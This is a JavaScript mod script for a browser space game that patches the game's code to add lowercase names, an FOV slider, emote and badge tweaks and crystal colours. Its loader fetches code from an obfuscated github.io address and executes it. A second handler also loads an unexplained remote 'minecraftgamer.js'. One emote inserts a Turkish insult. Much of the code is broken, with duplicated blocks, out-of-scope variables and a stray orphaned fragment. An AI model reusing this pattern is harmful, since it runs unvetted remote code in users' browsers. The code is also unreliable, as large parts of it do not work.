if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Global settings object
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: localStorage.getItem('emote-capacity') || 4,
  showBlankECP: localStorage.getItem('show-blank-ecp') === 'true'
};

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();
  logLowercase("Mod injected");
  window.modifiedSrc = src; // Store in window instead of returning
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const clownEmote = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  }`;

  src = src.replace(vocabPattern, `$1${clownEmote}`);
  checkSrcChange();

  logEmote("Clown emote injected");
  return src;
}

// FOV Editor Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

// Initialize FOV settings
window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function initializeFOVControls() {
    // Only initialize if not already done
    if (document.getElementById('mod-controls')) return;

    // Add styles
    const controlStyles = `
    <style>
    #mod-controls {
        position: fixed;
        top: 10px;
        left: 10px;
        z-index: 1000;
        font-family: Arial, sans-serif;
        user-select: none;
        background: linear-gradient(45deg, #8B008B, #FF1493);
        border: 1px solid #FF1493;
        color: white;
        padding: 5px;
        border-radius: 8px;
        opacity: 0.9;
        width: 150px;
    }

    #mod-controls-header {
        cursor: pointer;
        text-align: center;
        padding: 5px;
        border-bottom: 1px solid #FF1493;
    }

    #mod-controls-panel {
        padding: 5px;
        display: none;
    }

    .mod-control {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin: 5px 0;
    }

    #fov-display {
        padding: 5px;
        margin-top: 5px;
        display: none;
    }

    .toggle-switch {
        position: relative;
        display: inline-block;
        width: 30px;
        height: 17px;
    }

    .toggle-switch input {
        opacity: 0;
        width: 0;
        height: 0;
    }

    .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #ccc;
        transition: .4s;
    }

    input:checked + .slider {
        background-color: #FF1493;
    }
    </style>
    `;

    // Add HTML
    const controlsHTML = `
<div id="mod-controls">
    <div id="mod-controls-header">Game Controls</div>
    <div id="mod-controls-panel">
        <div class="mod-control">
            <span>FOV</span>
            <label class="toggle-switch">
                <input type="checkbox" id="fov-toggle">
                <span class="slider"></span>
            </label>
        </div>
        <div class="mod-control">
            <span>Blank ECP</span>
            <label class="toggle-switch">
                <input type="checkbox" id="blank-ecp-toggle">
                <span class="slider"></span>
            </label>
        </div>
    </div>
    <div id="fov-display">
        FOV: <span id="fov-value">45</span>
    </div>
</div>
`;

    // Add elements to document
    document.head.insertAdjacentHTML('beforeend', controlStyles);
    document.body.insertAdjacentHTML('beforeend', controlsHTML);

    // Get elements
    const controlsPanel = document.getElementById('mod-controls-panel');
    const controlsHeader = document.getElementById('mod-controls-header');
    const fovToggle = document.getElementById('fov-toggle');
    const fovDisplay = document.getElementById('fov-display');
    const fovValue = document.getElementById('fov-value');

    // Set initial states
    const savedFOVEnabled = localStorage.getItem('fov-enabled') === 'true';
    window.modSettings.fovEnabled = savedFOVEnabled;
    fovToggle.checked = savedFOVEnabled;
    fovDisplay.style.display = savedFOVEnabled ? 'block' : 'none';

    // Add event listeners
    controlsHeader.addEventListener('click', () => {
        controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
    });

    fovToggle.addEventListener('change', (e) => {
        window.modSettings.fovEnabled = e.target.checked;
        localStorage.setItem('fov-enabled', e.target.checked);
        fovDisplay.style.display = e.target.checked ? 'block' : 'none';
    });

    // Add wheel event listener for FOV change
document.addEventListener('wheel', (e) => {
    if (!window.modSettings.fovEnabled) {
        return;
    }
    e.preventDefault();
    const delta = e.deltaY < 0 ? 1 : -1;
    window.I1000.currentFOV = Math.max(30, Math.min(120, window.I1000.currentFOV + delta));
    if (fovValue) {
        fovValue.textContent = window.I1000.currentFOV;
    }
}, { passive: false });

    logFOV("FOV controls initialized");
}

function fovInjector(sbCode) {
    let src = sbCode;
    let prevSrc = src;

    function checkSrcChange() {
        if (src === prevSrc) throw new Error("replace did not work");
        prevSrc = src;
    }

    // Replace FOV calculation
 const fovPattern = /this\.I1000\.fov\s*=\s*45\s*\*\s*this\.IO11l\.I1000\.zoom/g;
  src = src.replace(fovPattern, 'this.I1000.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IO11l.I1000.zoom');
  checkSrcChange();

    // Initialize controls when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initializeFOVControls);
    } else {
        initializeFOVControls();
    }

    logFOV("FOV injector applied");
    return src;
}
// Add emote capacity mod
  const emoteCapacityMod = `
  var globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
  ChatPanel.prototype.getEmotesCapacity = function () {
    var num = this[globalVal].settings.get("chat_emotes_capacity");
    var result = 4; // Default value
    try {
      if (!(num == null || isNaN(num))) {
        result = Math.trunc(Math.min(Math.max(1, num), 5)) || 4;
      }
    } catch (e) {
      // Keep default value
    }
    return result;
  };
  ChatPanel.prototype.typed = new Function(ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"));
`;

// First ensure required objects exist
if (!window.module) window.module = {};
if (!window.module.exports) window.module.exports = {};
if (!window.module.exports.settings) {
    window.module.exports.settings = {
        set: function(key, value) {
            this[key] = value;
        },
        check: function(key) {
            return this[key];
        }
    };
}

// Ensure required objects exist
if (!window.module) window.module = {};
if (!window.module.exports) window.module.exports = {};
if (!window.module.exports.settings) {
    window.module.exports.settings = {
        set: function(key, value) {
            console.log(`Setting ${key} to ${value}`);
            this[key] = value;
        },
        check: function(key) {
            console.log(`Checking value of ${key}`);
            return this[key];
        }
    };
}

// Initialize the blank ECP functionality
// Initialize the blank ECP functionality
function initializeBlankECP() {
  try {
    console.log("Initializing blank ECP...");
    // Load saved preference
    const savedBlankECP = localStorage.getItem('show-blank-ecp') === 'true';
    console.log(`Loaded savedBlankECP: ${savedBlankECP}`);
    
    // Initialize settings
    window.modSettings.showBlankECP = savedBlankECP;
    if (window.module?.exports?.settings?.set) {
        window.module.exports.settings.set('show_blank_badge', savedBlankECP);
    }

    // Wait for DOM to be ready
    const initializeToggle = () => {
        const blankECPToggle = document.getElementById('blank-ecp-toggle');
        if (!blankECPToggle) {
            console.log('Waiting for blank-ecp-toggle element...');
            setTimeout(initializeToggle, 100); // Try again in 100ms
        } else {
            console.log("blank-ecp-toggle element found");
            // Set initial state
            blankECPToggle.checked = savedBlankECP;
            
            // Add change listener
            blankECPToggle.addEventListener('change', () => {
                const isChecked = blankECPToggle.checked;
                console.log(`blankECPToggle changed to: ${isChecked}`);
                
                // Update settings
                window.modSettings.showBlankECP = isChecked;
                localStorage.setItem('show-blank-ecp', isChecked);
                
                // Update module settings
                if (window.module?.exports?.settings?.set) {
                    try {
                        window.module.exports.settings.set('show_blank_badge', isChecked);
                    } catch (error) {
                        console.error('Error updating blank badge setting:', error);
                    }
                }
            });
        }
    };

    initializeToggle();
    
    // Apply the blank ECP modifications directly instead of using eval
    console.log("Starting blank ECP mod...");
    
    // Pattern for finding blank badge check
    const pattern = /,(\s*"blank"\s*!={1,2}\s*this\.custom\.badge)/;

    // Search through window properties
    for (let i in window) {
        try {
            let val = window[i]?.prototype;
            if (!val) continue;
            
            for (let j in val) {
                let func = val[j];
                
                // Check if the function matches our pattern
                if (typeof func === "function" && func.toString().match(pattern)) {
                    console.log(`Found matching function: ${j}`);
                    
                    // Replace the function with our modified version
                    val[j] = function(...args) {
                        // Get the original result
                        const origResult = func.apply(this, args);
                        // Override with our setting check
                        return window.module.exports.settings.check('show_blank_badge') || origResult;
                    };

                    // Modify drawIcon if it exists
                    if (val.drawIcon) {
                        console.log("Modifying drawIcon function");
                        const originalDrawIcon = val.drawIcon;
                        val.drawIcon = function(...args) {
                            if (this.icon === "blank") {
                                return originalDrawIcon.apply(this, args);
                            }
                            if (this.icon !== "blank") {
                                return originalDrawIcon.apply(this, args);
                            }
                            return originalDrawIcon.apply(this, args); // Default case
                        };
                    }

                    // Find and modify the leaderboard table function
                    let gl = window[i];
                    for (let k in gl) {
                        if (typeof gl[k] === "function" && gl[k].toString().includes(".table")) {
                            console.log("Modifying leaderboard table function:", k);
                            const oldF = gl[k];
                            gl[k] = function(...args) {
                                const current = window.module.exports.settings.check('show_blank_badge');
                                if (this.showBlank !== current) {
                                    for (let i in this.table) {
                                        if (i.startsWith("blank")) {
                                            delete this.table[i];
                                        }
                                    }
                                    this.showBlank = current;
                                }
                                return oldF.apply(this, args);
                            };
                            // Break the outer loop since we found what we needed
                            i = undefined;
                            break;
                        }
                    }
                }
            }
        } catch (e) {
            console.error('Error while processing window property:', e);
        }
    }
    
    console.log("Blank ECP mod applied successfully");
    
  } catch (e) {
    console.error('Error in initializeBlankECP:', e);
  }
}

// And ensure the required objects exist first:
if (!window.module) window.module = {};
if (!window.module.exports) window.module.exports = {};
if (!window.module.exports.settings) {
    window.module.exports.settings = {
        set: function(key, value) {
            console.log(`Setting ${key} to ${value}`);
            this[key] = value;
        },
        check: function(key) {
            console.log(`Checking value of ${key}`);
            return this[key];
        }
    };
}
const blankECPMod = `
/*
 Show blank ECPs on leaderboard
*/

let pattern = /,(\s*"blank"\s*!={1,2}\s*this\\.custom\\.badge)/;

console.log("Starting blank ECP mod...");

Search: for (let i in window) {
  try {
    let val = window[i]?.prototype;
    if (!val) continue;
    for (let j in val) {
      let func = val[j];
      
      if (typeof func === "function" && func.toString().match(pattern)) {
        // Use a regular function instead of Function constructor
        val[j] = function(...args) {
          const origResult = func.apply(this, args);
          return window.module.exports.settings.check('show_blank_badge') || origResult;
        };

        if (val.drawIcon) {
          const originalDrawIcon = val.drawIcon;
         val.drawIcon = function(...args) {
  if (this.icon === "blank") {
    return originalDrawIcon.apply(this, args);
  }
  if (this.icon !== "blank") {
    return originalDrawIcon.apply(this, args);
  }
  return originalDrawIcon.apply(this, args); // Default case
};
        }
      }
    }
  } catch (e) {
    console.error('Error in blank ECP mod:', e);
  }
}
console.log("Finished blank ECP mod");
`;
  // Add crystal color mod
const crystalColorMod = `
  let CrystalObject;
  
  // Wait for Crystal object to be available
  const findCrystalObject = () => {
    for (let i in window) {
      try {
        let val = window[i];
        if ("function" == typeof val.prototype.createModel && val.prototype.createModel.toString().includes("Crystal")) {
          CrystalObject = val;
          // Attach to window for global access
          window.CrystalObject = CrystalObject;
          initializeCrystalModifications();
          break;
        }
      } catch (e) {}
    }
  };

  const initializeCrystalModifications = () => {
    let oldModel = CrystalObject.prototype.getModelInstance;
    
    const getCustomCrystalColor = function () {
      return localStorage.getItem("crystal-color") || "#ffffff";
    };

// Fix 1: Modify the Crystal Color implementation
CrystalObject.prototype.getModelInstance = (function() {
    const originalMethod = CrystalObject.prototype.getModelInstance;
    return function() {
        const result = originalMethod.apply(this, arguments);
        const color = getCustomCrystalColor();
        if (this.material && this.material.color && color) {
            this.material.color.set(color);
            this.material.needsUpdate = true;
        }
        return result;
    };
})();
    // Extend the CrystalObject to track instances
    CrystalObject.instances = new Set();

    // Override the constructor to track instances
    const originalConstructor = CrystalObject.prototype.constructor;
    CrystalObject.prototype.constructor = function (...args) {
      originalConstructor.apply(this, args);
      CrystalObject.instances.add(this);
    };

    // Override destroy method
    const originalDestroy = CrystalObject.prototype.destroy;
    CrystalObject.prototype.destroy = function (...args) {
      CrystalObject.instances.delete(this);
      if (originalDestroy) originalDestroy.apply(this, args);
    };
  };

  // Function to update the crystal color immediately
  window.updateCrystalColor = function(color) {
    localStorage.setItem("crystal-color", color);
    
    if (window.CrystalObject && window.CrystalObject.instances) {
      requestAnimationFrame(() => {
        for (const instance of window.CrystalObject.instances) {
          if (instance.material && instance.material.color) {
            instance.material.color.set(color);
            // Force material update
            instance.material.needsUpdate = true;
          }
        }
      });
    }
  };

  // Start looking for Crystal object
  findCrystalObject();
`;

      src = src.replace('</body>', `
        ${controlStyles}
        ${controlsHTML}
        <script>
        ${emoteCapacityMod}
        ${blankECPMod}
        ${crystalColorMod}
        // ... rest of your script ...
        </script>
        </body>`);

    checkSrcChange();
    logFOV("FOV injector applied");
    return src;
}
    const fovDisplay = document.getElementById('fov-display');

document.addEventListener('wheel', (e) => {
    if (!window.modSettings.fovEnabled) {
        return; // This is OK in event listener context
    }
    e.preventDefault();
    const delta = e.deltaY < 0 ? 1 : -1;
    window.I1000.currentFOV = Math.max(30, Math.min(120, window.I1000.currentFOV + delta));
    if (fovValue) {
        fovValue.textContent = window.I1000.currentFOV;
    }
}, { passive: false });

    document.addEventListener('DOMContentLoaded', () => {
      const controlsHeader = document.getElementById('mod-controls-header');
      const controlsPanel = document.getElementById('mod-controls-panel');
      const fovToggle = document.getElementById('fov-toggle');
      const emoteSlider = document.getElementById('emote-capacity-slider');
      const emoteValue = document.getElementById('emote-capacity-value');
      const blankECPToggle = document.getElementById('blank-ecp-toggle');
      const crystalColorHex = document.getElementById('crystal-color-hex');

      // Initialize values from localStorage
      const savedCrystalColor = localStorage.getItem('crystal-color');
      if (savedCrystalColor) {
        crystalColorHex.value = savedCrystalColor;
      }

      controlsHeader.addEventListener('click', () => {
        controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
      });

      fovToggle.addEventListener('change', () => {
        window.modSettings.fovEnabled = fovToggle.checked;
        fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
      });

      emoteSlider.addEventListener('input', () => {
        const value = emoteSlider.value;
        emoteValue.textContent = value;
        window.modSettings.emoteCapacity = value;
        localStorage.setItem('emote-capacity', value);
        if (window.ChatPanel) {
          window.ChatPanel.prototype.getEmotesCapacity = function () {
            return parseInt(value);
          };
        }
      });

      blankECPToggle.addEventListener('change', () => {
        window.modSettings.showBlankECP = blankECPToggle.checked;
        localStorage.setItem('show-blank-ecp', blankECPToggle.checked);
        if (window.module && window.module.exports) {
          window.module.exports.settings.set('show_blank_badge', blankECPToggle.checked);
        }
      });

      // Set the "Show Blank ECPs" to true by default
      if (window.module && window.module.exports) {
        window.module.exports.settings.set('show_blank_badge', true);
      }

      crystalColorHex.addEventListener('input', () => {
        const color = crystalColorHex.value;
        updateCrystalColor(color); // Update the color immediately
      });
    });
    </script>
    </body>`);

  checkSrcChange();

  logFOV("FOV injector applied");
  return src;
// Unmatched closing brace removed: }

// Add all injectors
window.sbCodeInjectors = window.sbCodeInjectors || [];

// Modified version of the injectors
window.sbCodeInjectors.push((sbCode) => {
    try {
        lowercaseInjector(sbCode);
        return window.modifiedSrc; // Need to return the modified source
    } catch (error) {
        console.error(`${modName} failed to load; error:`, error);
        throw error;
    }
});

window.sbCodeInjectors.push((sbCode) => {
    try {
        const modified = emoteInjector(sbCode);
        window.modifiedSrc = modified;
        return modified; // Need to return the modified source
    } catch (error) {
        console.error(`${emoteModName} failed to load; error:`, error);
        throw error;
    }
});

window.sbCodeInjectors.push((sbCode) => {
    try {
        let modified = sbCode;
        lowercaseInjector(modified);
        emoteInjector(modified);
        fovInjector(modified);
        return window.modifiedSrc; // Need to return the final modified source
    } catch (error) {
        console.error(`Mod failed to load; error:`, error);
        throw error;
    }
});
// Main code injection logic
const log = (msg) => console.log(`%c[Mod injector] ${msg}`, "color: #06c26d");

// Function to inject the loader
function injectLoader() {
    if (window.location.pathname !== "/") {
        log("Injection not needed");
        return;
    }

    const url = `https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html?_=${new Date().getTime()}`;

    fetch(url)
        .then(response => response.text())
        .then(starSRC => {
            if (starSRC) {
                log("Source fetched successfully");
                const start_time = performance.now();
                log("Applying mods...");

                window.modifiedSrc = starSRC;

                if (window.sbCodeInjectors) {
                    for (const injector of window.sbCodeInjectors) {
                        try {
                            if (typeof injector === "function") {
                                injector(window.modifiedSrc);
                            }
                        } catch (error) {
                            console.error('Injector error:', error);
                        }
                    }
                }

                const end_time = performance.now();
                log(`Mods applied (${(end_time - start_time).toFixed(0)}ms)`);

                // Use the final modified source
                const script = document.createElement('script');
                script.textContent = window.modifiedSrc;
                document.body.appendChild(script);
            }
        })
        .catch(error => {
            log("Source fetch failed");
            console.error(error);
            alert("Failed to load game code");
        });
}

// Run the injectLoader function immediately
injectLoader();



document.addEventListener('DOMContentLoaded', function () {
  const script = document.createElement('script');
  script.src = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/minecraftgamer.js';
  script.async = true; // Add async loading
  script.onload = function () {
    console.log('minecraftgamer.js loaded successfully.');
  };
  script.onerror = function (error) {
    console.error('Failed to load minecraftgamer.js:', error);
    // Add fallback behavior if needed
  };
  document.body.appendChild(script);
});
